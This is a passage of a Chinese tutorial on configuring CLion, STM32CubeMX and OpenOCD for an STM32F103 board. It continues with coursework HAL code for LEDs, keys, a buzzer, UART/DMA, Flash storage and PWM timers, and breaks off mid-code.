    "content": "一、配置环境  1、IDE安装  我采用JetBrian开发的Clion进行开发，该软件对非商业用途免费，进入官网CLion Free for non-commercial use即可直接下载安装。  2、CubeMX与CubeCLT 我采用keysking开发的FubeMX协助进行环境安装。首先安装FubeMX，目录随意。安装完成后打开：    从此处先安装STM32CubeMX，也可以在官网进行下载。下载好安装包后按默认路径安装，一路确定即可。  之后继续从此处安装STM32CubeCLT，与上述操作一样地，下载好安装包后按默认路径安装，一路确定即可。  此处安装可以参考爽！手把手教你用CLion开发STM32【大人，时代变啦！！！】，只需参考CubeMX与CubeCLT安装部分即可。  3、OpenOCD安装 OpenOCD则在官网Download OpenOCD for Windows下载并安装，同样下载好安装包后按默认路径安装，一路确定即可。  4、Clion配置  打开Clion：   点击设置（Settings）：   之后按照安装路径参考图片进行配置：   注意选择编译器时，使用arm-none-eabi-gcc.exe和，arm-none-eabi-g++.exe。  之后修改CMake配置：   然后记住安装上述三个工具的路径，配置嵌入式开发环境：   最后在高级设置中启用调试器：   此处参考文献：  爽！手把手教你用CLion开发STM32【大人，时代变啦！！！】 - bilibili  【教程】配置 CLion 优雅开发 STM32 - 略无慕艳意 - 博客园  但要注意，上述配置过程中会遇到一些问题，需要参考本文后续叠加起来综合使用。  二、新建项目：  首先在Clion中点击新建嵌入式的项目：   注意不要直接新建，先点击启动STM32CubeMX，然后点击Start My project from MCU：   由于学校下发的材料为基于STM32F103VET6的野火指南者开发板，输入芯片规格，选中芯片后点击Start Project：   按照如图方式选择调试模式，注意一定要选择Serial Wire：   选中后可以发现左侧GPIO标识变绿。最后设置项目名和工具链，注意工具链一定选择CMake：   最后点击右上角GENERATE CORE即可：  记住路径后关闭窗口，回到Clion，将路径输入，可以发现此时可以创建项目了：   配置好Debug和Release两个CMake工具：   在此处点编辑配置：   进行OpenOCD配置：   注意此处要自己在任意位置新建一个.cfg文件，里面输入： # 野火FireDAP仿真器配置（基于CMSIS-DAP） source [find interface/cmsis-dap.cfg]  # 选择SWD接口 transport select swd  # 通信速率（1000kHz，兼容大多数情况） adapter speed 1000  # 目标芯片配置 source [find target/stm32f1x.cfg]  # STM32F103VET6 Flash配置（512KB） set FLASH_SIZE 0x80000  # 复位配置（关键：启用系统复位） reset_config srst_only srst_nogate  # 核心逻辑：利用before_init回调，在init执行前强制配置端口 # 解决CLion命令顺序导致的\"tcl port must be before init\"错误 proc before_init {} {     # 禁用tcl和gdb端口（使用正确的语法：tcl port 而非 tcl_port）     tcl port disabled     gdb port disabled }   最后点击确定即可。  代码在Core目录下，其中Src存放.c或.cpp文件，Inc存放.h文件：   此时如果连接开发板，点击绿色三角进行运行，若控制台显示如下良好，则表示配置完成。 [0mOpen On-Chip Debugger 0.12.0 (2024-09-16) . [https://github.com/sysprogs/openocd] Licensed under GNU GPL v2 libusb1 d52e355daa09f17ce64819122cb067b8a2ee0d4b For bug reports, read         http://openocd.org/doc/doxygen/bugs.html before_init DEPRECATED! use 'tcl port' not 'tcl_port' DEPRECATED! use 'gdb port', not 'gdb_port' DEPRECATED! use 'tcl port' not 'tcl_port' [0mInfo : CMSIS-DAP: SWD supported Info : CMSIS-DAP: Atomic commands supported Info : CMSIS-DAP: Test domain timer supported Info : CMSIS-DAP: FW Version = 2.0.0 Info : CMSIS-DAP: Interface Initialised (SWD) Info : SWCLK/TCK = 1 SWDIO/TMS = 1 TDI = 0 TDO = 1 nTRST = 0 nRESET = 1 Info : CMSIS-DAP: Interface ready Info : clock speed 1000 kHz Info : SWD DPIDR 0x1ba01477 Info : [stm32f1x.cpu] Cortex-M3 r1p1 processor detected Info : [stm32f1x.cpu] target has 6 breakpoints, 4 watchpoints Info : [stm32f1x.cpu] Examination succeed Info : [stm32f1x.cpu] gdb port disabled [stm32f1x.cpu] halted due to breakpoint, current mode: Thread xPSR: 0x01000000 pc: 0x0800219c msp: 0x20010000 ** Programming Started ** Info : device id = 0x10036414 Info : flash size = 512 KiB Warn : Adding extra erase range, 0x080031ac .. 0x080037ff ** Programming Finished ** shutdown command invoked    三、开发 本节中左右代码已上传至Github，仓库地址https://github.com/lamaper/BIT_ECE_STM32。  本节中所有作业来自上课课件，课件已经上传至BIT101仓库，本课程编号：100120050。  本节中采用的硬件是学校派发的野火指南者开发板，本文采用HAL库开发而不是标准库。硬件官方参考文档：[野火]STM32 HAL库开发实战指南-基于F103系列开发板—文档，其中给出了开发板外设地址：  /*片上外设基地址  */  #define PERIPH_BASE         ((unsigned int)0x40000000)   /*总线基地址，GPIO都挂载到APB2上 */  #define APB2PERIPH_BASE     (PERIPH_BASE + 0x10000)   /*GPIOB外设基地址*/  #define GPIOA_BASE          (APB2PERIPH_BASE + 0x0800)   /* GPIOB寄存器地址,强制转换成指针 */  #define GPIOA_CRL           *(unsigned int*)(GPIOA_BASE+0x00)  #define GPIOA_CRH           *(unsigned int*)(GPIOA_BASE+0x04)  #define GPIOA_IDR           *(unsigned int*)(GPIOA_BASE+0x08)  #define GPIOA_ODR           *(unsigned int*)(GPIOA_BASE+0x0C)  #define GPIOA_BSRR          *(unsigned int*)(GPIOA_BASE+0x10)  #define GPIOA_BRR           *(unsigned int*)(GPIOA_BASE+0x14)  #define GPIOA_LCKR          *(unsigned int*)(GPIOA_BASE+0x18)   /*RCC外设基地址*/  #define RCC_BASE           (AHBPERIPH_BASE + 0x1000)  /*RCC的AHB1时钟使能寄存器地址,强制转换成指针*/  #define RCC_APB2ENR        *(unsigned int*)(RCC_BASE+0x18)  作业-寄存器亮灯 作业内容：使用相应软件操作STM32开发板，用GPIO控制LED发光，用寄存器方式，分别地发射绿光、蓝光，用寄存器方式，控制LED发射黄光、紫光、白光，在黄、紫、白光中任选一种，提交工程压缩包。  首先查询官方操作手册，获取不同颜色LED灯的针脚信息以操作其发出不同颜色的光，创建文件led.h用于记录宏，之后创建LED控制宏以确保LED正常亮灭、定义一些快速操作的宏，方便后面快速调用颜色： #ifndef __LED_H #define __LED_H /**  * @author lamaper(Guo Jun Qi 1120241725)  */  #include \"main.h\"  /* ---------- LED引脚与时钟定义 ---------- */ // 红色LED（LED1） #define LED1_GPIO_PORT    GPIOB #define LED1_GPIO_PIN     GPIO_PIN_5 #define LED1_CLK_ENABLE() __HAL_RCC_GPIOB_CLK_ENABLE()  // 绿色LED（LED2） #define LED2_GPIO_PORT    GPIOB #define LED2_GPIO_PIN     GPIO_PIN_0 #define LED2_CLK_ENABLE() __HAL_RCC_GPIOB_CLK_ENABLE()  // 蓝色LED（LED3） #define LED3_GPIO_PORT    GPIOB #define LED3_GPIO_PIN     GPIO_PIN_1 #define LED3_CLK_ENABLE() __HAL_RCC_GPIOB_CLK_ENABLE()   /* ---------- LED控制宏（低电平点亮） ---------- */ #define LED_ON  GPIO_PIN_RESET  // 低电平点亮 #define LED_OFF GPIO_PIN_SET    // 高电平熄灭  // 基础控制宏 #define LED1_SetState(state) HAL_GPIO_WritePin(LED1_GPIO_PORT, LED1_GPIO_PIN, (state)) #define LED2_SetState(state) HAL_GPIO_WritePin(LED2_GPIO_PORT, LED2_GPIO_PIN, (state)) #define LED3_SetState(state) HAL_GPIO_WritePin(LED3_GPIO_PORT, LED3_GPIO_PIN, (state))  // 快捷操作宏 #define LED1_On()  LED1_SetState(LED_ON) #define LED1_Off() LED1_SetState(LED_OFF) #define LED1_Toggle() HAL_GPIO_TogglePin(LED1_GPIO_PORT, LED1_GPIO_PIN)  #define LED2_On()  LED2_SetState(LED_ON) #define LED2_Off() LED2_SetState(LED_OFF) #define LED2_Toggle() HAL_GPIO_TogglePin(LED2_GPIO_PORT, LED2_GPIO_PIN)  #define LED3_On()  LED3_SetState(LED_ON) #define LED3_Off() LED3_SetState(LED_OFF) #define LED3_Toggle() HAL_GPIO_TogglePin(LED3_GPIO_PORT, LED3_GPIO_PIN)  /* ---------- 组合颜色宏 ---------- */ #define LED_Red()    do { LED1_On();  LED2_Off(); LED3_Off(); } while(0) #define LED_Green()  do { LED1_Off(); LED2_On();  LED3_Off(); } while(0) #define LED_Blue()   do { LED1_Off(); LED2_Off(); LED3_On();  } while(0) #define LED_Yellow() do { LED1_On();  LED2_On();  LED3_Off(); } while(0) #define LED_Purple() do { LED1_On();  LED2_Off(); LED3_On();  } while(0) #define LED_Cyan()   do { LED1_Off(); LED2_On();  LED3_On();  } while(0) #define LED_White()  do { LED1_On();  LED2_On();  LED3_On();  } while(0) #define LED_RGBOff() do { LED1_Off(); LED2_Off(); LED3_Off(); } while(0)  /* ---------- 函数声明 ---------- */ void LED_Init(void);   #endif /* __LED_H */  在led.c中编辑初始化LED的函数： #include \"led.h\"  /**  * @author lamaper (Guo Jun Qi 1120241725)  * @brief 初始化LED对应的GPIO  * @note 配置为推挽输出、无上下拉、低速  */ void LED_Init(void) {     GPIO_InitTypeDef GPIO_InitStruct = {0};      // 使能GPIOB时钟     LED1_CLK_ENABLE();     LED2_CLK_ENABLE();     LED3_CLK_ENABLE();      // 配置GPIO为推挽输出     GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;     GPIO_InitStruct.Pull = GPIO_NOPULL;     GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;      // 配置LED1引脚     GPIO_InitStruct.Pin = LED1_GPIO_PIN;     HAL_GPIO_Init(LED1_GPIO_PORT, &amp;GPIO_InitStruct);      // 配置LED2引脚     GPIO_InitStruct.Pin = LED2_GPIO_PIN;     HAL_GPIO_Init(LED2_GPIO_PORT, &amp;GPIO_InitStruct);      // 配置LED3引脚     GPIO_InitStruct.Pin = LED3_GPIO_PIN;     HAL_GPIO_Init(LED3_GPIO_PORT, &amp;GPIO_InitStruct);      // 初始状态：所有LED熄灭     LED_RGBOff(); }  之后就可以在main函数中配置基础逻辑了： void HW1_SpmLight(void)// 用寄存器的方式，分别地发射绿光、蓝光 {   LED_Green();  HAL_Delay(500);  // 绿灯亮500ms   LED_Blue();   HAL_Delay(500);  // 蓝灯亮500ms } void HW1_MixLight(void) // 用寄存器的方式，控制LED发射黄光、紫光、白光 {   LED_Yellow(); HAL_Delay(500);  // 黄灯亮500ms   LED_Purple(); HAL_Delay(500);  // 紫灯亮500ms   LED_White();  HAL_Delay(500);  // 白灯亮500ms } void HW1_Submit(void) // 选择黄光、紫光、白光的任意一种提交工程压缩包 {   LED_Yellow(); // 黄灯长亮 }  编译运行后可以看到结果：   作业-按键与亮灯 作业内容：使用相应软件操作STM32开发板，使得按KEY1，控制LED灯在“红光-绿光-蓝光-白光”四种方式之间切换按KEY2，控制LED灯熄灭。  首先查询官方操作手册，获取KEY1和KEY2的针脚信息以操作其发出不同颜色的光，创建文件key.h用于记录宏： #ifndef __KEY_H #define __KEY_H  #include \"main.h\"  /* 按键引脚定义（野火指南者开发板） */ // KEY1 -&gt; PC13 #define KEY1_GPIO_PORT    GPIOC #define KEY1_GPIO_PIN     GPIO_PIN_13 #define KEY1_CLK_ENABLE() __HAL_RCC_GPIOA_CLK_ENABLE()  // KEY2 -&gt; PA0 #define KEY2_GPIO_PORT    GPIOA #define KEY2_GPIO_PIN     GPIO_PIN_0 #define KEY2_CLK_ENABLE() __HAL_RCC_GPIOC_CLK_ENABLE()  /* 函数声明 */ void KEY_Init(void); uint8_t KEY_Scan(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin);  #endif /* __KEY_H */  单片机中按键检测并没有被封装，因而需要我们自行实现按下的逻辑检测。按键机械触点断开、闭合时，由于触点的弹性作用，按键开关不会马上稳定接通或一下子断开，使用按键时会产生带波纹信号，需要用软件消抖处理滤波，不方便输入检测。    本此实验采用的野火STM32指南者开发板（STM32F103VET6）板所搭载的按键带硬件消抖功能，它利用电容充放电的延时，消除了波纹，从而简化软件的处理，软件只需要直接检测引脚的电平即可。    从按键的原理图可知，这些按键在没有被按下的时候，GPIO引脚的输入状态为低电平；当按键按下时，GPIO引脚的输入状态为高电平。只要我们检测引脚的输入电平，即可判断按键是否被按下。  基于此在后续创建key.c控制按键识别，其中KEY_Init函数用来初始化按键，用KEY_Scan函数检测按钮状态，虽然硬件自带抖动消除，但是这里为了练习，使用HAL库的延时函数： #include \"key.h\"  /**  * @brief 初始化按键GPIO  */ void KEY_Init(void) {     GPIO_InitTypeDef GPIO_InitStruct = {0};      // 使能按键对应GPIO时钟     KEY1_CLK_ENABLE();     KEY2_CLK_ENABLE();      // 配置KEY1（PA0，上拉输入）     GPIO_InitStruct.Pin = KEY1_GPIO_PIN;     GPIO_InitStruct.Mode = GPIO_MODE_INPUT;     GPIO_InitStruct.Pull = GPIO_PULLUP;  // 上拉输入，按键按下为低电平     HAL_GPIO_Init(KEY1_GPIO_PORT, &amp;GPIO_InitStruct);      // 配置KEY2（PC13，上拉输入）     GPIO_InitStruct.Pin = KEY2_GPIO_PIN;     GPIO_InitStruct.Mode = GPIO_MODE_INPUT;     GPIO_InitStruct.Pull = GPIO_PULLUP;  // 上拉输入，按键按下为低电平     HAL_GPIO_Init(KEY2_GPIO_PORT, &amp;GPIO_InitStruct); }  /**  * @brief 按键扫描（带消抖，使用HAL_Delay）  * @param GPIOx: 按键GPIO端口  * @param GPIO_Pin: 按键GPIO引脚  * @retval 1: 按键按下（已消抖），0: 未按下  */ uint8_t KEY_Scan(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin) {     static uint8_t key_up = 1;  // 按键松开标志      if (key_up &amp;&amp; (HAL_GPIO_ReadPin(GPIOx, GPIO_Pin) == GPIO_PIN_RESET))     {         HAL_Delay(20);  // 消抖延时（使用HAL库延迟）         if (HAL_GPIO_ReadPin(GPIOx, GPIO_Pin) == GPIO_PIN_RESET)         {             key_up = 0;  // 标记按键按下             return 1;    // 返回按下状态         }     }     else if (HAL_GPIO_ReadPin(GPIOx, GPIO_Pin) == GPIO_PIN_SET)     {         HAL_Delay(20);  // 消抖延时         if (HAL_GPIO_ReadPin(GPIOx, GPIO_Pin) == GPIO_PIN_SET)         {             key_up = 1;  // 标记按键松开         }     }     return 0;  // 未按下 }  之后就可以在main函数中配置基础逻辑了。 void HW2(void) {   if (mode == 0) {     LED_RGBOff();     mode += 1;   }   // 作业2：KEY1切换模式（红光→绿光→蓝光→白光循环）   if (KEY_Scan(KEY1_GPIO_PORT, KEY1_GPIO_PIN) == 1)   {     current_mode++;     if (current_mode &gt;= 4)  // 超过白光模式(3)则回到红光(0)       current_mode = 0;      // 根据当前模式切换LED（直接使用led.h中的宏）     switch(current_mode)     {       case 0: LED_Red();HAL_Delay(200);    break;       case 1: LED_Green();HAL_Delay(200);  break;       case 2: LED_Blue();HAL_Delay(200);   break;       case 3: LED_White();HAL_Delay(200);  break;       default: LED_RGBOff();break;     }   }    // 作业2：KEY2熄灭LED   if (KEY_Scan(KEY2_GPIO_PORT, KEY2_GPIO_PIN) == 1)   {     current_mode = 4;  // 标记为熄灭模式     LED_RGBOff();   }    HAL_Delay(10);  // 消抖延时 }   作业-蜂鸣器 作业内容：使用相应软件操作STM32开发板，写一个函数，使用SysTick方法，计时0.25s使蜂鸣器产生n次短鸣+1长鸣，n=mod(学号末位)+1短鸣的时间为0.25s，长鸣时间为1s，每次鸣响之间间隔1s蜂鸣响起的同时，红色LED灯同时亮起。  我的学号末尾是5，后面采用5。  首先查询官方操作手册，获取蜂鸣器的针脚信息，创建文件beep.h用于记录宏，通过查询该开发板的技术手册可以得知，这块开发板采用有源蜂鸣器。STM32 驱动蜂鸣器的核心原理，是通过GPIO 引脚输出控制信号，配合蜂鸣器自身的发声结构，最终将电信号转化为声音信号。对于有源蜂鸣器，其内部自带振荡电路且包含芯片，只需GPIO输出高低电平——通电响、断电停——即可使其发声。基于此，定义如下宏以方便开发： #ifndef __BEEP_H #define __BEEP_H  #include \"main.h\" #include \"led.h\" // 用于控制红色LED（LED1）  /* ---------- 蜂鸣器硬件配置 ---------- */ #define BEEP_GPIO_PORT        GPIOA                   /* 蜂鸣器GPIO端口 */ #define BEEP_GPIO_PIN         GPIO_PIN_8              /* 蜂鸣器GPIO引脚 */ #define BEEP_GPIO_CLK_ENABLE() __HAL_RCC_GPIOA_CLK_ENABLE()  /* 蜂鸣器时钟使能 */  /* 蜂鸣器控制宏（高电平触发鸣响） */ #define BEEP_ON  GPIO_PIN_SET #define BEEP_OFF GPIO_PIN_RESET #define BEEP_SetState(state) HAL_GPIO_WritePin(BEEP_GPIO_PORT, BEEP_GPIO_PIN, (state)) #define BEEP_On()  BEEP_SetState(BEEP_ON) #define BEEP_Off() BEEP_SetState(BEEP_OFF)  /* 函数声明 */ void BEEP_Init(void);                    // 蜂鸣器GPIO初始化 void BEEP_AlarmWithLED(uint8_t n);       // 1次短鸣 + 1次长鸣（同步红色LED亮灭）  #endif /* __BEEP_H */   在beep.c中实现头文件中定义的函数。首先是初始化蜂鸣器的GPIO，最后实现蜂鸣器鸣叫函数：  #include \"beep.h\"  /* 蜂鸣器GPIO初始化：配置为推挽输出 */ void BEEP_Init(void) {     GPIO_InitTypeDef GPIO_InitStruct = {0};      /* 使能蜂鸣器GPIO时钟 */     BEEP_GPIO_CLK_ENABLE();      /* 配置蜂鸣器引脚为推挽输出 */     GPIO_InitStruct.Pin = BEEP_GPIO_PIN;     GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;   // 推挽输出     GPIO_InitStruct.Pull = GPIO_NOPULL;           // 无上下拉     GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;  // 低速     HAL_GPIO_Init(BEEP_GPIO_PORT, &amp;GPIO_InitStruct);      /* 初始状态：蜂鸣器关闭 */     BEEP_Off(); }  /* 蜂鸣器鸣响+LED同步逻辑：n次短鸣(0.25s) + 1次长鸣(1s) */ void BEEP_AlarmWithLED(uint8_t n) {     uint8_t i;      /* 计算n：n = mod(学号末位,5) + 1 →      * 我的学号末位为5，即n = 5%5 +1 = 1 */     n = (n % 5) + 1;      /* 执行n次“短鸣+间隔” */     for (i = 0; i &lt; n; i++)     {         BEEP_On();   // 蜂鸣器响         LED1_On();   // 红色LED亮         HAL_Delay(250);  // 短鸣持续0.25s          BEEP_Off();  // 蜂鸣器关         LED1_Off();  // 红色LED灭         HAL_Delay(1000); // 短鸣间隔1s     }      /* 执行1次“长鸣” */     BEEP_On();     LED1_On();     HAL_Delay(1000); // 长鸣持续1s      /* 结束后关闭蜂鸣器和LED */     BEEP_Off();     LED1_Off(); }   作业-串口通信 作业内容：使用相应软件操作STM32开发板，用直接配置串口的方式，向PC传输一句话在FLASH中存储一句话，并用DMA配置串口向PC传输。  串口通讯是一种设备间非常常用的串行通讯方式，因为它简单便捷，因此大部分电子设备都支持该通讯方式，电子工程师在调试设备时也经常使用该通讯方式输出调试信息。  USART（Universal Synchronous/Asynchronous Receiver/Transmitter）是 STM32 芯片里的一种串行通信外设。它的主要功能就是把数据（字节）转换成一位一位的电平信号，通过TX引脚发出去，或者从RX引脚接收一位一位的电平信号，再拼成字节给CPU。在本实验中，只用到USART1的异步模式，即串口通信。  基于上述原理，创建文件usart.h用于记录宏： // // Created by lamaper on 2025/9/2. //  #ifndef __USART_H #define __USART_H  #include \"stm32f1xx_hal.h\" #include \"stm32f1xx_hal_uart.h\" #include &lt;string.h&gt;  /* 外部句柄 */ extern UART_HandleTypeDef huart1; extern DMA_HandleTypeDef hdma_tx;  /* 初始化 */ void USART1_UART_Init(void);  /* 普通发送 */ void UART_SendString(char *str);  /* DMA 发送 */ void UART_SendString_DMA(char *str);  #endif /* __USART_H */   之后开始编写初始化usart函数，首先开启USART1、GPIOA、DMA1时钟,之后配置引脚，在STM32F103系列芯片中，统一规定了USART1的引脚是PA9（TX，发送）和PA10（RX，接收）。在此处设置TX为复用推挽，使其能输出波形；RX作为输入，设为上拉状态，记为空闲。然后配置通信格式。 // // Created by lamaper on 2025/9/2. //  #include \"usart.h\"  UART_HandleTypeDef huart1; DMA_HandleTypeDef hdma_tx;  void USART1_UART_Init(void) {     __HAL_RCC_USART1_CLK_ENABLE();     __HAL_RCC_GPIOA_CLK_ENABLE();     __HAL_RCC_DMA1_CLK_ENABLE();      /* PA9 = TX, PA10 = RX */     GPIO_InitTypeDef GPIO_InitStruct = {0};      GPIO_InitStruct.Pin = GPIO_PIN_9;     GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;     GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_HIGH;     HAL_GPIO_Init(GPIOA, &amp;GPIO_InitStruct);      GPIO_InitStruct.Pin = GPIO_PIN_10;     GPIO_InitStruct.Mode = GPIO_MODE_INPUT;     GPIO_InitStruct.Pull = GPIO_NOPULL;     HAL_GPIO_Init(GPIOA, &amp;GPIO_InitStruct);      /* USART1 配置: 115200 8N1 */     huart1.Instance = USART1;     huart1.Init.BaudRate = 115200;     huart1.Init.WordLength = UART_WORDLENGTH_8B;     huart1.Init.StopBits = UART_STOPBITS_1;     huart1.Init.Parity = UART_PARITY_NONE;     huart1.Init.Mode = UART_MODE_TX_RX;     huart1.Init.HwFlowCtl = UART_HWCONTROL_NONE;     huart1.Init.OverSampling = UART_OVERSAMPLING_16;     HAL_UART_Init(&amp;huart1);      /* DMA 配置: USART1_TX = DMA1_Channel4 */     hdma_tx.Instance = DMA1_Channel4;     hdma_tx.Init.Direction = DMA_MEMORY_TO_PERIPH;     hdma_tx.Init.PeriphInc = DMA_PINC_DISABLE;     hdma_tx.Init.MemInc = DMA_MINC_ENABLE;     hdma_tx.Init.PeriphDataAlignment = DMA_PDATAALIGN_BYTE;     hdma_tx.Init.MemDataAlignment = DMA_MDATAALIGN_BYTE;     hdma_tx.Init.Mode = DMA_NORMAL;     hdma_tx.Init.Priority = DMA_PRIORITY_LOW;     HAL_DMA_Init(&amp;hdma_tx);      __HAL_LINKDMA(&amp;huart1, hdmatx, hdma_tx);      /* DMA NVIC */     HAL_NVIC_SetPriority(DMA1_Channel4_IRQn, 1, 0);     HAL_NVIC_EnableIRQ(DMA1_Channel4_IRQn); }  void UART_SendString(char *str) {     HAL_UART_Transmit(&amp;huart1, (uint8_t*)str, strlen(str), HAL_MAX_DELAY); }  void UART_SendString_DMA(char *str) {     HAL_UART_Transmit_DMA(&amp;huart1, (uint8_t*)str, strlen(str)); }    STM32F1 的主存储器是片上Flash，既用来存程序，也能存数据。其掉电不丢失，适合存储固定配置；Flash以页为单位擦除，不能只擦除一个字节；以半字，即16bit为最小写入单位，必须2字节对齐。如果要操作，首先要解锁Flash，然后擦除页使其恢复0xFF，之后逐字（半字）写入数据，最后锁上Flash。  在flash.h中声明两个函数负责读写，同时选一个安全带页地址，本文选择STM32F103VET6 最后2K的起始地址（0x0807F800U）： // // Created by lamaper on 2025/9/2. //  #ifndef __FLASH_H #define __FLASH_H  #include \"stm32f1xx_hal.h\" #include &lt;string.h&gt;  /* 选一个安全的页地址（比如最后一页） */ #define FLASH_PAGE_ADDR 0x0807F800U  // STM32F103VET6 最后 2K 的起始地址  void Flash_Write(uint32_t addr, uint8_t *data, uint16_t len); void Flash_Read(uint32_t addr, uint8_t *buf, uint16_t len);  #endif /* __FLASH_H */   在flash.c中实现他们： // // Created by lamaper on 2025/9/2. //  #include \"flash.h\"  void Flash_Write(uint32_t addr, uint8_t *data, uint16_t len) {     HAL_FLASH_Unlock();      /* 先擦除页（注意：Flash 必须先擦才能重新写） */     FLASH_EraseInitTypeDef erase = {0};     uint32_t pageError = 0;     erase.TypeErase = FLASH_TYPEERASE_PAGES;     erase.PageAddress = FLASH_PAGE_ADDR;     erase.NbPages = 1;     HAL_FLASHEx_Erase(&amp;erase, &amp;pageError);      /* 半字写入 */     for (uint16_t i = 0; i &lt; len; i += 2)     {         uint16_t halfword = data[i];         if (i + 1 &lt; len) halfword |= (data[i+1] &lt;&lt; 8);         HAL_FLASH_Program(FLASH_TYPEPROGRAM_HALFWORD, addr + i, halfword);     }      HAL_FLASH_Lock(); }  void Flash_Read(uint32_t addr, uint8_t *buf, uint16_t len) {     for (uint16_t i = 0; i &lt; len; i++)     {         buf[i] = *(volatile uint8_t*)(addr + i);     } }   之后就可以在main函数中配置基础逻辑了： void HW4(void) {   USART1_UART_Init();    /* 1. 普通发送 */   UART_SendString(\"Hello, I'm lamaper! This is UART direct send!\\r\\n\");    /* 2. Flash 存储一句话 */   char msg[] = \"Hello from Flash + DMA!\\r\\n\";   Flash_Write(FLASH_PAGE_ADDR, (uint8_t*)msg, strlen(msg)+1);    /* 3. 读回并用 DMA 发送 */   char buf[64];   Flash_Read(FLASH_PAGE_ADDR, (uint8_t*)buf, strlen(msg)+1);   UART_SendString_DMA(buf); }  此外，注意到电脑本身并没有串口监控程序，需要单另下载，因而在Microsoft Store中下载相关工具，启动串口监听，有如下结果：    作业-七彩灯 作业内容：使用相应软件操作STM32开发板，以TIM3输出PWM，控制全彩LED灯变换颜色以另一个TIM作为计数器，每1s产生1次中断以中断控制一个状态机，改变全彩灯的CCR达到效果：赤-橙-黄-绿-青-蓝-紫，七种颜色循环切换，每1s切换一个颜色。  PWM 是 Pulse Width Modulation（脉冲宽度调制）的缩写，是一种通过改变脉冲信号的高电平持续时间与周期的比例，来模拟信号效果的数字控制技术。STM32 的定时器，如TIM3，可硬件生成高精度 PWM 信号，无需 CPU 持续干预。对 LED 来说，在频率足够高的情况下，人眼会因为视觉暂留把高频闪烁看作持续的光。TIMx作为PWM的时基有频率公式： \\(f_{PWM} = \\frac{f_{TIMCLK}}{(PSC+1) \\times (ARR+1)}\\)  其中ARR为自动重装载寄存器，决定周期长度，即计数上限；PSC为预分频器，决定计数节拍变慢多少；CRR是捕获/比较寄存器，对应占空比。在STM32F103系列芯片中，TIM3有多个通道能做PWM，通过重映射可以把它们映射到开发板的引脚上： // // Created by lamaper on 2025/9/2. //  #ifndef __TIM_H #define __TIM_H  #include \"stm32f1xx_hal.h\"      // HAL 基础 #include \"stm32f1xx_hal_tim.h\"  // TIM HAL  /* 全局句柄（只声明） */ extern TIM_HandleTypeDef htim3; // PWM (RGB) extern TIM_HandleTypeDef htim4; // 1s 周期中断  /* 初始化 */ void TIM3_PWM_Init(uint16_t arr, uint16_t psc); void TIM4_1s_Init(uint16_t arr, uint16_t psc);  /* 设置 RGB 占空比：0~arr（arr=自动重装值） */ void LED_SetRGB(uint16_t r, uint16_t g, uint16_t b);  /* 作业5：七彩灯（1s 切换） */ void Rainbow_Init(void);  /* 作业6：四彩呼吸灯（周期 1.5s） */ void Breath_Init(void);  void LED_ChannelTest(void);  #endif  接下来实现切换颜色。这里应作业要求，使用另一个计时器，本文采用TIM4.切换颜色并不需要高频变换，最自然的办法是使用计时器做一个1Hz的软节拍，每1s产生一次更新中断。NVIC 开启 TIM4_IRQn，在TIM4_IRQHandler 里调用HAL_TIM_IRQHandler，最终会进入HAL_TIM_PeriodElapsedCallback。 IM_HandleTypeDef htim3; TIM_HandleTypeDef htim4;  #ifndef M_PI #define M_PI 3.14159265358979323846 #endif  typedef enum { MODE_NONE = 0, MODE_RAINBOW, MODE_BREATH } TimerMode_t; static TimerMode_t g_mode = MODE_NONE; / void TIM3_PWM_Init(uint16_t arr, uint16_t psc) {     __HAL_RCC_TIM3_CLK_ENABLE();     __HAL_RCC_GPIOB_CLK_ENABLE();     __HAL_RCC_AFIO_CLK_ENABLE();      /* TIM3 部分重映射: CH2-&gt;PB5, CH3-&gt;PB0, CH4-&gt;PB1 */     __HAL_AFIO_REMAP_TIM3_PARTIAL();      GPIO_InitTypeDef GPIO_InitStruct = {0};     GPIO_InitStruct.Mode  = GPIO_MODE_AF_PP;     GPIO_InitStruct.Pull  = GPIO_NOPULL;     GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_HIGH;      /* R/G/B 对应引脚 */     GPIO_InitStruct.Pin = GPIO_PIN_5; HAL_GPIO_Init(GPIOB, &amp;GPIO_InitStruct); // CH2 → PB5 → R     GPIO_InitStruct.Pin = GPIO_PIN_0; HAL_GPIO_Init(GPIOB, &amp;GPIO_InitStruct); // CH3 → PB0 → G     GPIO_InitStruct.Pin = GPIO_PIN_1; HAL_GPIO_Init(GPIOB, &amp;GPIO_InitStruct); // CH4 → PB1 → B      /* TIM3 基本参数 */     htim3.Instance = TIM3;     htim3.Init.Prescaler         = psc;     htim3.Init.CounterMode       = TIM_COUNTERMODE_UP;     htim3.Init.Period            = arr;     htim3.Init.ClockDivision     = TIM_CLOCKDIVISION_DIV1;     htim3.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;     HAL_TIM_PWM_Init(&amp;htim3);      /* 三路 PWM 通道配置：有效低（低电平点亮，数值越大越亮） */     TIM_OC_InitTypeDef sOC = {0};     sOC.OCMode     = TIM_OCMODE_PWM1;     sOC.Pulse      = 0;     sOC.OCPolarity = TIM_OCPOLARITY_LOW;      // ★ 有效低     sOC.OCFastMode = TIM_OCFAST_DISABLE;      HAL_TIM_PWM_ConfigChannel(&amp;htim3, &amp;sOC, TIM_CHANNEL_2); // R     HAL_TIM_PWM_ConfigChannel(&amp;htim3, &amp;sOC, TIM_CHANNEL_3); // G     HAL_TIM_PWM_ConfigChannel(&amp;htim3, &amp;sOC, TIM_CHANNEL_4); // B      HAL_TIM_PWM_Start(&amp;htim3, TIM_CHANNEL_2);     HAL_TIM_PWM_Start(&amp;htim3, TIM_CHANNEL_3);     HAL_TIM_PWM_Start(&amp;htim3, TIM_CHANNEL_4); }  void TIM4_Base_Init(uint16_t arr, uint16_t psc) {     __HAL_RCC_TIM4_CLK_ENABLE();      htim4.Instance = TIM4;     htim4.Init.Prescaler         = psc;     htim4.Init.CounterMode       = TIM_COUNTERMODE_UP;     htim4.Init.Period            = arr;     htim4.Init.ClockDivision     = TIM_CLOCKDIVISION_DIV1;     htim4.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;     HAL_TIM_Base_Init(&amp;htim4);      